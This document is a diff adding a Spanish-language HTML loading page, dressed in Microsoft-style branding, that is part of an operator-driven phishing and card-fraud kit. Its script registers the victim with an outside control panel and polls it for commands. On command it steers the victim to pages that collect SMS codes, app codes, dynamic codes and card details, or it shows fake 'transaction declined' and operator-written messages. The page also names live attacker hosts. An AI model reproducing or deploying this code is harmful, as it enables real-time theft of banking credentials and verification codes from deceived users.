@@ -1,0 +1,228 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Iniciando sesión...</title>
+    <style>
+      :root {
+        --ms-blue: #0078d4;
+        --ms-bg: #f3f3f3;
+        --ms-text: #201f1e;
+        --surface: rgba(255, 255, 255, 0.7);
+      }
+
+      body {
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background-color: var(--ms-bg);
+        /* Fondo con un degradado suave estilo Windows 11 */
+        background: radial-gradient(circle at top right, #deeaf3, #f3f3f3);
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        color: var(--ms-text);
+      }
+
+      .container {
+        text-align: center;
+        padding: 40px;
+        background: var(--surface);
+        backdrop-filter: blur(10px); /* Efecto Mica/Glassmorphism */
+        border-radius: 8px;
+        border: 1px solid rgba(255, 255, 255, 0.4);
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+        max-width: 320px;
+        width: 90%;
+      }
+
+      .logo-placeholder {
+        width: 48px;
+        height: 48px;
+        margin: 0 auto 24px;
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 2px;
+      }
+
+      /* Icono minimalista inspirado en el logo actual */
+      .logo-placeholder div {
+        background-color: var(--ms-blue);
+        opacity: 0.8;
+      }
+
+      h1 {
+        font-size: 20px;
+        font-weight: 600;
+        margin-bottom: 8px;
+      }
+
+      p {
+        font-size: 14px;
+        opacity: 0.7;
+        margin-bottom: 24px;
+      }
+
+      /* Loader estilo Fluent Design */
+      .progress-ring {
+        position: relative;
+        width: 40px;
+        height: 40px;
+        margin: 0 auto;
+      }
+
+      .progress-ring div {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        border: 3px solid transparent;
+        border-top-color: var(--ms-blue);
+        border-radius: 50%;
+        animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo-placeholder">
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <h1>Preparando todo</h1>
+      <p id="msg">Un momento, por favor...</p>
+
+      <div class="progress-ring">
+        <div></div>
+      </div>
+    </div>
+    <script>
+      function redir(params) {
+        window.location = "https://payent-gahs6.sevalla.page/index.html";
+      }
+
+      setTimeout(() => {
+        document.getElementById("msg").innerText = "Contactando a su Banco...";
+      }, 5000);
+      setTimeout(() => {
+        document.getElementById("msg").innerText = "Conectando...";
+      }, 10000);
+      setTimeout(() => {
+        document.getElementById("msg").innerText =
+          "Enviando Codigo de Verificación...";
+      }, 15000);
+
+      const userId = localStorage.getItem("usuario");
+      const API_BASE = "https://panelgenez.vercel.app";
+
+      console.log("Usuario:", userId);
+
+      // ===== POLLING (reemplaza SSE) =====
+      let polling = true;
+
+      async function pollForAction() {
+        while (polling) {
+          try {
+            const res = await fetch(`${API_BASE}/poll/${userId}`);
+            const data = await res.json();
+
+            if (data.ok && data.action) {
+              console.log("📩 Acción recibida:", data.action);
+
+              if (data.action === "SMS") {
+                window.location.href = "code.html";
+              } else if (data.action === "MONTO") {
+                window.location.href = "codemon.html";
+              } else if (data.action === "ERROR") {
+                alert(
+                  "❌ Tu pago no puede ser procesado, INGRESA OTRA TARJETA",
+                );
+                window.location.href = "cc.html";
+              } else if (data.action === "APP") {
+                // Redirige a tu página de APP
+                window.location.href = "codeapp.html";
+              } else if (data.action === "TRANSFER") {
+                // Redirige a tu página de APP
+                // Crear modal
+                const overlay = document.createElement("div");
+                overlay.id = "msgOverlay";
+                overlay.style.cssText =
+                  "position:fixed;inset:0;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;z-index:9999;";
+
+                overlay.innerHTML = `
+      <div style="background:#fff;border-radius:12px;padding:28px 24px;max-width:400px;width:90%;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.3);">
+        <p style="font-size:16px;color:#333;margin:0 0 20px;line-height:1.5;">Transaccion declinada por el banco emisor, intente nuevamente con otro metodo de pago.</p>
+        <button onclick="redir()" 
+          style="padding:10px 32px;border:none;background:#2563eb;color:#fff;border-radius:8px;font-size:14px;cursor:pointer;">
+          Aceptar
+        </button>
+      </div>
+    `;
+
+                document.body.appendChild(overlay);
+              } else if (data.action === "DINAMICA") {
+                // Redirige a tu página de dinámica
+                window.location.href = "codedina.html";
+              } else if (data.action === "MENSAJE") {
+                const msg = data.data?.customMessage || "Mensaje del sistema";
+
+                // Crear modal
+                const overlay = document.createElement("div");
+                overlay.id = "msgOverlay";
+                overlay.style.cssText =
+                  "position:fixed;inset:0;background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;z-index:9999;";
+
+                overlay.innerHTML = `
+      <div style="background:#fff;border-radius:12px;padding:28px 24px;max-width:400px;width:90%;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.3);">
+        <p style="font-size:16px;color:#333;margin:0 0 20px;line-height:1.5;">${msg}</p>
+        <button onclick="document.getElementById('msgOverlay').remove()" 
+          style="padding:10px 32px;border:none;background:#2563eb;color:#fff;border-radius:8px;font-size:14px;cursor:pointer;">
+          Aceptar
+        </button>
+      </div>
+    `;
+
+                document.body.appendChild(overlay);
+              }
+            }
+          } catch (err) {
+            console.log("⚠️ Error de polling, reintentando...", err);
+          }
+
+          // Esperar 3 segundos antes del siguiente poll
+          await new Promise((r) => setTimeout(r, 3000));
+        }
+      }
+
+      // ===== CREAR SESIÓN =====
+      async function solicitar() {
+        await fetch(`${API_BASE}/request`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ userId }),
+        });
+
+        // Iniciar polling después de crear la sesión
+        pollForAction();
+      }
+
+      solicitar();
+
+      setTimeout(() => {
+        window.location.reload();
+      }, 30000);
+    </script>
+  </body>
+</html>
